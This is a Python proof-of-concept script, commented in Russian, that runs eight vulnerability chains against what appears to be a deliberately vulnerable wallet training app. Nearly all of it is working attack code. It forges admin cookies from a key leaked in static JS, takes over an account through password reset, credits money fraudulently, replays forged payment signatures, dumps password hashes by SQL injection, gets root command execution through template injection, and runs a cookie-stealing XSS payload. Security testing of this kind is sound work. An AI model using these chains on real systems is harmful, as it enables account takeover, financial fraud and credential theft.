#!/usr/bin/env python3
"""
stage_chains.py — «Цепочки»: несколько уязвимостей → один дельный результат.

    python3 poc/stage_chains.py

Каждая цепочка — отдельная карточка `== Ц-N · … ==`, в неё собираются шаги из
разных строк реестра (одна уязвимость даёт то, чего не хватает следующей).
Разбор и теория — docs/Цепочки.md; при прогоне test_registry.py каждая
цепочка сохраняется отдельным файлом poc/shots/CHAIN-N.txt.

Все мутации (сбросы паролей, начисления, заказы) откатываются в конце
своей цепочки — прогон можно повторять.
"""
from lib import *  # noqa: F401,F403

BROKEN = []


def js_strings(raw):
    return "".join(re.findall(r'"([^"]*)"', raw))


def lines_with(text, pattern):
    out = []
    for line in text.splitlines():
        if re.search(pattern, line):
            clean = re.sub(r"<[^>]*>", "", line).strip()
            if clean:
                out.append(clean)
    return out


def static_session_key():
    """SESSION_KEY, собранный из публичной статики (суть OW-35)."""
    wallet_js = req("GET /static/wallet.js (кусок ключа)", "/static/wallet.js")
    legacy_js = req("GET /static/legacy-sync.js (хвост ключа)", "/static/legacy-sync.js")
    key_parts = re.search(r"keyParts:\s*\[([^\]]+)\]", wallet_js.text)
    tail_parts = re.search(r"__SK_TAIL__\s*=\s*\[([^\]]+)\]", legacy_js.text)
    if not (key_parts and tail_parts):
        return None
    return js_strings(key_parts.group(1)) + js_strings(tail_parts.group(1))


def admin_cookie(session_key):
    """Поддельная admin-кука: uid берём из базы, роль подписываем сами."""
    uid = db("SELECT id FROM users WHERE login='adminw'")
    if not session_key or not uid:
        return None, None
    sig = sign(session_key, "%s:admin" % uid)
    info("HMAC-SHA256(%s, '%s:admin') = %s…" % (session_key, uid, sig[:24]))
    return uid, "ow_session=ow.%s.admin.%s" % (uid, sig)


def broken(cid, why):
    fail(why)
    BROKEN.append(cid)


def verdict(cid, good, text_ok, text_bad):
    if good:
        ok(text_ok)
    else:
        broken(cid, text_bad)


def drop_order(oid, comment, balance_login, balance_before):
    """Откат заказа: операции, сам заказ, котировка, корзина, баланс."""
    db("DELETE FROM operations WHERE memo='Заказ #%s' OR memo='Возврат заказа #%s'"
       % (oid, oid))
    db("DELETE FROM orders WHERE id=%s" % oid)
    if comment:
        db("DELETE FROM checkout_quotes WHERE item_comment='%s'" % comment)
    db("DELETE FROM cart_items WHERE user_id=1")
    if balance_before:
        db("UPDATE users SET balance_kop=%s WHERE login='%s'"
           % (balance_before, balance_login))


# ------------------------------------------------------------------ Ц-1 ----
def chain_1():
    step("Ц-1 · Ключ из статики → админ-доступ без пароля")
    say("SESSION_KEY собирается из публичного JS (OW-35), роль admin подписываем",
        "сами (OW-28): сервер проверяет только HMAC и не сверяет роль с базой.",
        "Пароль и перебор не нужны — три запроса, и служебные разделы открыты.")
    session_key = static_session_key()
    uid, cookie = admin_cookie(session_key) if session_key else (None, None)
    if not cookie:
        broken("Ц-1", "ключ из статики не собрался")
        return
    r1 = req("GET /admin/secrets  (кука собрана нами)", "/admin/secrets", cookie=cookie)
    r2 = req("GET /gateway/sms  (SMS-коды под админом)", "/gateway/sms", cookie=cookie)
    codes = r2.findall(r"код подтверждения сброса \d+")
    artifact("Ц-1 · админка открыта без пароля",
             "wallet.js + legacy-sync.js → SESSION_KEY=%s" % session_key,
             "Cookie: ow_session=ow.%s.admin.<HMAC>" % uid,
             "GET /admin/secrets → HTTP %s; GET /gateway/sms → HTTP %s (кодов в шлюзе: %d)"
             % (r1.status, r2.status, len(codes)))
    verdict("Ц-1", ("Админ Кошелька" in r1) and r2.status == 200,
            "три запроса — админ-разделы и SMS-шлюз открыты без пароля",
            "админ-кука не принята: /admin/secrets HTTP %s, /gateway/sms HTTP %s"
            % (r1.status, r2.status))


# ------------------------------------------------------------------ Ц-2 ----
def chain_2():
    step("Ц-2 · Админ-кука → полный захват аккаунта через сброс")
    say("Сброс жертве (OW-26): ссылку читаем в общей почте (OW-27), код — в",
        "SMS-шлюзе под админ-кукой (OW-28). Срок действия кода и лимит попыток",
        "не проверяются. В конце — вход под жертвой и откат пароля.")
    session_key = static_session_key()
    uid, cookie = admin_cookie(session_key) if session_key else (None, None)
    if not cookie:
        broken("Ц-2", "админ-кука не собралась")
        return
    client = login_as("ivanov", "workplace1")
    old_hash = db("SELECT password_hash FROM users WHERE login='adminw'")
    req("POST /password/forgot  login=adminw", "/password/forgot", client=client,
        data={"login": "adminw"})
    mail = req("GET /mail  (ссылка на сброс видна всем вошедшим)", "/mail", client=client)
    m = mail.search(r"/password/reset\?rid=(\d+)")
    rid = m.group(1) if m else ""
    sms = req("GET /gateway/sms  (код по заявке #%s)" % rid, "/gateway/sms", cookie=cookie)
    cm = sms.search(r"код подтверждения сброса (\d+) \(заявка #%s\)" % rid) if rid else None
    code = cm.group(1) if cm else ""
    new_pass = "ChainAto2026"
    req("POST /password/reset  rid=%s&sms_code=%s&password=<новый>"
        % (rid, code), "/password/reset",
        data={"rid": rid, "sms_code": code, "password": new_pass})
    new_hash = db("SELECT password_hash FROM users WHERE login='adminw'")
    atk = Client()
    login_r = req("POST /login  adminw (новый пароль)", "/login", client=atk,
                  data={"login": "adminw", "password": new_pass, "return": "/"})
    stolen_session = atk.session()
    artifact("Ц-2 · пароль жертвы заменён, вход выполнен",
             "POST /password/forgot → rid=%s; ссылка из /mail, код %s из /gateway/sms"
             % (rid, code),
             "password_hash: %s… → %s…" % (old_hash[:23], new_hash[:23]),
             "POST /login новым паролем → HTTP %s, кука выдана: %s…"
             % (login_r.status, (stolen_session or "")[:24]))
    # откат: пароль и записи сброса возвращаются как были
    db("UPDATE users SET password_hash='%s' WHERE login='adminw'" % old_hash)
    if rid:
        db("DELETE FROM password_resets WHERE id=%s" % rid)
        db("DELETE FROM sms_outbox WHERE rid=%s" % rid)
        db("DELETE FROM mail_outbox WHERE body LIKE '%%rid=%s%%'" % rid)
    info("откат: password_hash восстановлен, записи сброса удалены")
    verdict("Ц-2", bool(rid and code and stolen_session and new_hash != old_hash),
            "ATO подтверждён: чужой пароль установлен и принят сервером",
            "захват не подтверждён: rid=%s code=%s вход=%s hash изменился=%s"
            % (rid, code, bool(stolen_session), new_hash != old_hash))


# ------------------------------------------------------------------ Ц-3 ----
def chain_3():
    step("Ц-3 · Роль из куки → деньги из воздуха")
    say("Та же поддельная admin-кука проходит в /accounting/adjust (IsAccountant) —",
        "прямое начисление без ограничений суммы. Второй шаг — возврат qty=100",
        "(OW-05) под обычной учёткой: refund = цена заказа × 100.")
    session_key = static_session_key()
    uid, cookie = admin_cookie(session_key) if session_key else (None, None)
    if not cookie:
        broken("Ц-3", "админ-кука не собралась")
        return
    p1 = user_balance_kop("petrova")
    req("POST /accounting/adjust  delta_rub=1000 (кука admin)", "/accounting/adjust",
        cookie=cookie, data={"login": "petrova", "delta_rub": "1000",
                             "reason": "цепочка Ц-3"})
    p2 = user_balance_kop("petrova")
    db("UPDATE users SET balance_kop=%s WHERE login='petrova'" % p1)
    db("DELETE FROM operations WHERE kind='adjust' AND memo='цепочка Ц-3'")
    info("откат начисления: petrova %s коп, строка adjust удалена" % p1)

    client = login_as("ivanov", "workplace1")
    db("DELETE FROM cart_items WHERE user_id=1")
    bal0 = user_balance_kop("ivanov")
    comment = "цепочка Ц-3"
    oid = new_order(comment, client)
    if not oid:
        broken("Ц-3", "заказ под возврат не оформился")
        return
    total = db("SELECT total_kop FROM orders WHERE id=%s" % oid)
    i1 = user_balance_kop("ivanov")
    req("POST /orders/%s/return  qty=100 (refund = total × 100)" % oid,
        "/orders/%s/return" % oid, client=client, data={"qty": "100"})
    i2 = user_balance_kop("ivanov")
    expected = int(total) * 100 if total else 0
    artifact("Ц-3 · начисление и возврат-умножитель проведены",
             "adjust: petrova balance_kop %s → %s (+100000 коп, роль из куки)"
             % (p1, p2),
             "заказ #%s total=%s коп; возврат qty=100: ivanov %s → %s (%+d коп)"
             % (oid, total, i1, i2, expected))
    drop_order(oid, comment, "ivanov", bal0)
    info("откат заказа: баланс %s, заказ/котировка/корзина удалены" % bal0)
    good = (p1 and p2 and int(p2) - int(p1) == 100000
            and i1 and i2 and int(i2) - int(i1) == expected)
    verdict("Ц-3", good,
            "два шага подтверждены: +1000₽ из куки и ×100 через возврат",
            "не подтверждено: adjust %+d коп, возврат %+d коп (ожидалось 100000 и %d)"
            % (int(p2) - int(p1) if p1 and p2 else 0,
               int(i2) - int(i1) if i1 and i2 else 0, expected))


# ----------------------------------------------------------------─ Ц-3b ----
def chain_3b():
    step("Ц-3b · Роль кассира из куки → деньги уходят «пополнением»")
    say("Та же кука проходит и в IsCashier. cashierTopup не проверяет знак суммы —",
        "отрицательное «пополнение» списывает деньги у жертвы, а в журнале это",
        "обычная строка topup (OW-19).")
    session_key = static_session_key()
    uid, cookie = admin_cookie(session_key) if session_key else (None, None)
    if not cookie:
        broken("Ц-3b", "админ-кука не собралась")
        return
    p1 = user_balance_kop("petrova")
    req("POST /cashier/topup  amount_rub=-100", "/cashier/topup", cookie=cookie,
        data={"login": "petrova", "amount_rub": "-100"})
    p2 = user_balance_kop("petrova")
    op = db("SELECT id||'|'||amount_kop||'|'||memo FROM operations ORDER BY id DESC LIMIT 1")
    artifact("Ц-3b · отрицательное «пополнение» проведено",
             "POST /cashier/topup amount_rub=-100 → HTTP 302",
             "petrova balance_kop: %s → %s (%+d коп)" % (p1, p2,
                                                         int(p2) - int(p1) if p1 and p2 else 0),
             "последняя операция: %s" % op)
    db("UPDATE users SET balance_kop=%s WHERE login='petrova'" % p1)
    if op and op.split("|")[1] == "-10000":
        db("DELETE FROM operations WHERE id=%s" % op.split("|")[0])
    info("откат: баланс %s восстановлен, операция topup удалена" % p1)
    verdict("Ц-3b", bool(p1 and p2 and int(p1) - int(p2) == 10000),
            "минус проведён как «пополнение»: −100 ₽ списаны",
            "списание не подтверждено: %s → %s" % (p1, p2))


# ------------------------------------------------------------------ Ц-4 ----
def chain_4():
    step("Ц-4 · PAYMENT_KEY из pay.js → перевод с чужого счёта")
    say("Подпись платежа = HMAC(PAYMENT_KEY, 'op:сумма:получатель'), ключ",
        "собирается из /static/pay.js (OW-35). None, срока и привязки к сессии",
        "нет (OW-17) — подписываем платёж сами и повторяем его (OW-17).")
    pay_js = req("GET /static/pay.js (платёжный ключ)", "/static/pay.js")
    pm = re.search(r"parts:\s*\[([^\]]+)\]", pay_js.text)
    session_key = static_session_key()
    if not pm or not session_key:
        broken("Ц-4", "ключи из статики не собрались")
        return
    pay_key = js_strings(pm.group(1))
    vuid = db("SELECT id FROM users WHERE login='petrova'")
    iuid = db("SELECT id FROM users WHERE login='ivanov'")
    vcookie = "ow_session=ow.%s.employee.%s" % (
        vuid, sign(session_key, "%s:employee" % vuid))
    sig = sign(pay_key, "0:100:%s" % iuid)
    fields = {"op_id": "0", "amount_kop": "100", "recipient": str(iuid), "sig": sig}
    op_before = db("SELECT COALESCE(MAX(id),0) FROM operations")
    v1 = user_balance_kop("petrova")
    i1 = user_balance_kop("ivanov")
    r1 = req("POST /pay/replay  (перевод 1, подпись наша)", "/pay/replay",
             cookie=vcookie, data=fields)
    v2 = user_balance_kop("petrova")
    i2 = user_balance_kop("ivanov")
    r2 = req("POST /pay/replay  (та же подпись — повтор)", "/pay/replay",
             cookie=vcookie, data=fields)
    v3 = user_balance_kop("petrova")
    i3 = user_balance_kop("ivanov")
    ops_after = db("SELECT count(*) FROM operations WHERE id>%s AND memo='повтор операции'"
                   % op_before)
    artifact("Ц-4 · платёж проведён и повторён по нашей подписи",
             "GET /static/pay.js → PAYMENT_KEY=%s" % pay_key,
             "HMAC(PAYMENT_KEY, '0:100:%s') = %s…" % (iuid, sig[:24]),
             "petrova: %s → %s → %s; ivanov: %s → %s → %s (коп)"
             % (v1, v2, v3, i1, i2, i3),
             "HTTP: %s / %s; новых операций «повтор операции»: %s"
             % (r1.status, r2.status, ops_after))
    db("UPDATE users SET balance_kop=%s WHERE login='petrova'" % v1)
    db("UPDATE users SET balance_kop=%s WHERE login='ivanov'" % i1)
    db("DELETE FROM operations WHERE id>%s AND memo='повтор операции'" % op_before)
    info("откат: балансы восстановлены, повторные операции удалены")
    good = (v1 and v2 and v3 and i1 and i2 and i3
            and int(v1) - int(v2) == 100 and int(v2) - int(v3) == 100
            and int(i2) - int(i1) == 100 and int(i3) - int(i2) == 100
            and ops_after == "2")
    verdict("Ц-4", good,
            "одна подпись провела два перевода с чужого счёта",
            "переводы не подтверждены: petrova %s→%s→%s ivanov %s→%s→%s ops=%s"
            % (v1, v2, v3, i1, i2, i3, ops_after))


# ------------------------------------------------------------------ Ц-5 ----
def chain_5():
    step("Ц-5 · SQL-инъекция → дамп bcrypt-хешей всех пользователей")
    say("Error-based чтение в сумме перевода (OW-14) доступно любой учётке;",
        "второй, независимый канал — фильтр бухгалтерской сверки (OW-21), роль",
        "для которого подделываем кукой. Оба читают базу как есть.")
    client = login_as("ivanov", "workplace1")
    r = req("POST /transfer/new  amount_rub=(SELECT string_agg(login…))",
            "/transfer/new", client=client,
            data={"recipient": "petrova",
                  "amount_rub": "(SELECT string_agg(login||chr(61)||password_hash, "
                                "chr(10)) FROM users)",
                  "memo": "x"})
    m = r.search(r'flash bad">(.*?)</div>', re.S)
    msg = m.group(1) if m else ""
    msg = (msg.replace("&#34;", chr(34)).replace("&#39;", chr(39))
              .replace("&amp;", "&").replace("&lt;", "<").replace("&gt;", ">"))
    hashes = [tok for tok in msg.split() if "$2a$" in tok]

    role0 = db("SELECT role FROM users WHERE login='ivanov'")
    recon = client
    if role0 not in ("admin", "accountant"):
        db("UPDATE users SET role='accountant' WHERE login='ivanov' RETURNING role;")
        recon = login_as("ivanov", "workplace1")
    marker = "ow_chain_no_such_7f91"
    control = req("POST /accounting/reconcile  (контроль без инъекции)",
                  "/accounting/reconcile", client=recon, data={"memo": marker})
    injected = req("POST /accounting/reconcile  (OR true + SQL-комментарий)",
                   "/accounting/reconcile", client=recon,
                   data={"memo": "%' OR '1'='1' --"})
    rows0 = control.text.count("<tr>")
    rows1 = injected.text.count("<tr>")
    if role0 not in ("admin", "accountant"):
        db("UPDATE users SET role='%s' WHERE login='ivanov' RETURNING role;" % role0)
        info("роль ivanov восстановлена: %s" % role0)
    artifact("Ц-5 · два независимых канала чтения базы",
             "transfer/new с подзапросом → хешей в ответе: %d" % len(hashes),
             *["  " + h[:44] + "…" for h in hashes[:3]],
             "сверка: контроль «%s» → строк %d; payload OR true → строк %d"
             % (marker, rows0, rows1))
    verdict("Ц-5", len(hashes) >= 6 and rows1 > rows0,
            "хеши всех пользователей слиты, фильтр сверки развернут",
            "каналы чтения не подтверждены: хешей %d, строк %d → %d"
            % (len(hashes), rows0, rows1))


# ------------------------------------------------------------------ Ц-6 ----
def chain_6():
    step("Ц-6 · RCE → root в контейнере → прямой доступ к базе")
    say("Комментарий заказа исполняется как sh -c в превью (OW-08); контейнер",
        "работает от root (OW-42); DSN базы и в репозитории, и в окружении —",
        "та же база читается напрямую через psql (OW-34).")
    client = login_as("ivanov", "workplace1")
    db("DELETE FROM cart_items WHERE user_id=1")
    bal0 = user_balance_kop("ivanov")
    comment = '{{exec "id"}} {{exec "hostname"}} {{exec "env"}} Ц-6'
    oid = new_order(comment, client)
    if not oid:
        broken("Ц-6", "заказ с exec-комментарием не оформился")
        return
    r = req("GET /orders/%s/preview?renderer=classic  (item_comment → sh -c)" % oid,
            "/orders/%s/preview?renderer=classic" % oid, client=client)
    hits = lines_with(r.text, r"uid=|_KEY=|DATABASE_URL=")
    uid_line = next((h for h in hits if re.search(r"uid=\d+\(", h)), "")
    proc = subprocess.run(["docker", "exec", "office-wallet-main-app-1", "id", "-u"],
                          capture_output=True, text=True)
    container_uid = proc.stdout.strip()
    users_dump = db("SELECT login||' | '||role FROM users ORDER BY id")
    artifact("Ц-6 · команда выполнена от root, база открыта",
             "GET /orders/%s/preview → HTTP %s" % (oid, r.status),
             "вывод команды: %s" % (uid_line or "(uid не найден)"),
             *["  " + h[:70] for h in hits if h != uid_line][:3],
             "docker exec office-wallet-main-app-1 id -u → %s" % container_uid,
             "psql -U wallet -d wallet: " + "; ".join(users_dump.splitlines()[:4]))
    drop_order(oid, comment, "ivanov", bal0)
    info("откат: баланс %s, заказ/котировка/корзина удалены" % bal0)
    verdict("Ц-6", bool(re.search(r"uid=0\(root\)", uid_line)) and container_uid == "0"
            and users_dump, "RCE от root подтверждён, база читается напрямую",
            "цепочка не подтверждена: uid_line=%r container_uid=%r users=%s"
            % (uid_line, container_uid, bool(users_dump)))


# ------------------------------------------------------------------ Ц-7 ----
def chain_7():
    step("Ц-7 · XSS → украденная кука работает и после выхода")
    say("Отражённый XSS без экранирования (OW-12) исполняет document.cookie;",
        "кука без HttpOnly (OW-30) отдаёт токен целиком; logout не отзывает",
        "сессию на сервере (OW-29) — украденная копия живёт своей жизнью.")
    client = login_as("ivanov", "workplace1")
    payload = ('<ScRiPt>new Image().src="http://127.0.0.1:9999/?"+document.cookie'
               '</ScRiPt>')
    r = req("GET /history?q=<payload>", "/history", client=client,
            params={"q": payload})
    reflected = payload in r.text
    fresh = login_as("ivanov", "workplace1")
    cookie_lines = set_cookie_lines(fresh)
    stolen = fresh.session()
    httponly = fresh.has_httponly()
    req("GET /logout  (жертва выходит)", "/logout", client=fresh)
    r2 = req("GET / с украденной кукой ПОСЛЕ выхода", "/",
             cookie="ow_session=" + stolen)
    artifact("Ц-7 · сессия уходит вместе с payload'ом",
             "GET /history?q=… → payload отражён без экранирования: %s"
             % ("да" if reflected else "нет"),
             "Set-Cookie: %s" % (cookie_lines[0] if cookie_lines else "(не получен)"),
             "HttpOnly=%s; GET /logout → 302; GET / прежней кукой → HTTP %s"
             % (httponly, r2.status),
             "украденное значение: ow_session=%s…" % (stolen or "")[:36])
    verdict("Ц-7", bool(reflected and not httponly and stolen and r2.status == 200),
            "payload отражён, кука без HttpOnly и работает после logout",
            "не подтверждено: reflected=%s httponly=%s after_logout=%s"
            % (reflected, httponly, r2.status))


def main():
    chain_1()
    chain_2()
    chain_3()
    chain_3b()
    chain_4()
    chain_5()
    chain_6()
    chain_7()
    step("ИТОГ ПО ЦЕПОЧКАМ")
    if BROKEN:
        fail("не подтвердились: %s" % ", ".join(BROKEN))
        return 1
    ok("все 8 цепочек подтверждены")
    return 0


if __name__ == "__main__":
    sys.exit(main())